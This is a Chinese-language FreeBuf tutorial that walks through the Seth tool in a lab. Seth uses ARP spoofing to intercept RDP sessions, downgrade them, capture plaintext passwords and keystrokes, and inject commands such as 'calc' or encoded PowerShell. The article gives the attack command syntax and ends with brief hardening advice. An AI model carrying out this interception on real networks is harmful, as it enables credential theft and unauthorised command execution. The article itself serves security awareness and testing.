*****本文原创作者：2cat，本文属FreeBuf原创奖励计划，未经许可禁止转载**  
**

 ** **PS：本文仅做技术讨论，严禁用于非法用途****

 **今天和大家分享个小技术，简单几步通过执行MitM攻击同时从RDP连接中提取明文凭据。**
**我这里使用的测试环境是Linux（1台）、Windows（2台），此环境仅供大家参考。**

在工作的项目中，经常会有用户问及使用远程桌面是否安全，对此我们更多想到的是关于RDP
3389的各种爆破或是0day漏洞进行批量处理，但爆破毕竟也存在一定的运气成分，万一手潮就不好说了。

之前大家用的比较多的可能是利用Cain&Abel进行中间人攻击，操作上手也比较简单，在windows环境下的图形界面进行操作，可惜只能嗅探不能执行cmd等扩展功能。

Seth是一个用Python和Bash编写的工具，通过尝试降级连接用以提取明文凭证来实现MitM
RDP连接。它的出现可以让更多人提高安全认识，也可以在测试、安全研讨会或会谈的背景下教育大家正确配置RDP连接的重要性。

下面先去github下载工具包。

    
    
    root@2cats:~# git clonehttps://github.com/SySS-Research/Seth.git

![Clipboard
Image.png](https://image.3001.net/images/20180719/15320052226189.png!small)

使用环境：

> ¨ python3
>
> ¨ tcpdump
>
> ¨ arpspoof
>
> ¨ arpspoof
>
> ¨ openssl

通过帮助命令，可以查看命令语法和使用格式，由于时间原因具体参数介绍略过。

    
    
    root@2cats:~/Seth# ./seth.py -h

![Clipboard
Image.png](https://image.3001.net/images/20180719/15320052551101.png!small)

渗透测试具体用法：

    
    
    $ ./seth.sh <INTERFACE> <ATTACKER IP><VICTIM IP> <GATEWAY IP|HOST IP> [<COMMAND>]

如果在同一网段，RDP主机与受害计算机位于同一子网上不需要加网关地址，否则IP网关地址必须、必须写上。

<COMMAND>是最后一个参数,是可选的。它可以包含通过按键事件注入模拟WIN + R在RDP主机上执行的命令。

按键注入取决于受害者使用的键盘布局，目前它仅在英国美国版OS上可靠。建议通过使用避免使用特殊字符powershell -enc <STRING>，其

中STRING是您的UTF-16le和Base64编码命令。但是，calc应用非常普遍，我们以后渗透测试也会用到它并完成测试。  

用shell脚本执行ARP欺骗以获得Man-in-the-Middle位置并重定向流量，使其通过RDP代理运行，代理可以单独调用。

也可以将Seth与Responder结合使用，这个非常有用。使用Responder获得Man-in-the-Middle位置并同时运行Seth。运行seth.py -h以获取更多信息。

具体渗透测试过程如下：

查看渗透测试Attack主机，已经配置好并对接口和相关主机进行监听，如果成功，将执行弹出calc计算器程序。

    
    
    root@2cats:~/Seth# ./seth.sh eth0192.168.41.{175,141,173} calc

![Clipboard
Image.png](https://image.3001.net/images/20180719/15320052854853.png!small)

环境搭建好，我们进行渗透测试，在远程PC客户端进行RDP连接操作。

![Clipboard
Image.png](https://image.3001.net/images/20180719/1532005315753.png!small)

提示弹出用户（administrator）和密码（Sec@123）进行认证操作。

![Clipboard
Image.png](https://image.3001.net/images/20180719/15320053346867.png!small)

弹出警告提示框，我们这里选择Yes继续。  

![Clipboard
Image.png](https://image.3001.net/images/20180719/15320053465343.png!small)

下面显示已经成功进行RDP操作，并且连接成功，且弹出计算器程序。

![Clipboard
Image.png](https://image.3001.net/images/20180719/15320053596120.png!small)

我们进一步测试，在远程桌面服务器运行cmd命令后，执行了ipconfig查看本机网络的命令操作。

![Clipboard
Image.png](https://image.3001.net/images/20180719/15320053681004.png!small)

下面显示成功的截获PC客户端RDP的连接信息，并克隆最初始目标主机的x509证书。

![Clipboard
Image.png](https://image.3001.net/images/20180719/15320053797734.png!small)

远程目标主机的用户名和密码信息已经获取，同时记录的用户键盘的操作命令。

![Clipboard
Image.png](https://image.3001.net/images/20180719/1532005396386.png!small)

就用户使用RDP服务的安全问题，常见安全加固方法有4个方面：可以修改端口；受信的SSL证书；连接时仅使用网络级别的身份验证或使用防火墙限制源地址等。

好了，今天分享到这里，有兴趣的兄弟可以留言讨论哈，还有哪些更好的防御措施。

 ***本文原创作者：2cat，本文属FreeBuf原创奖励计划，未经许可禁止转载**

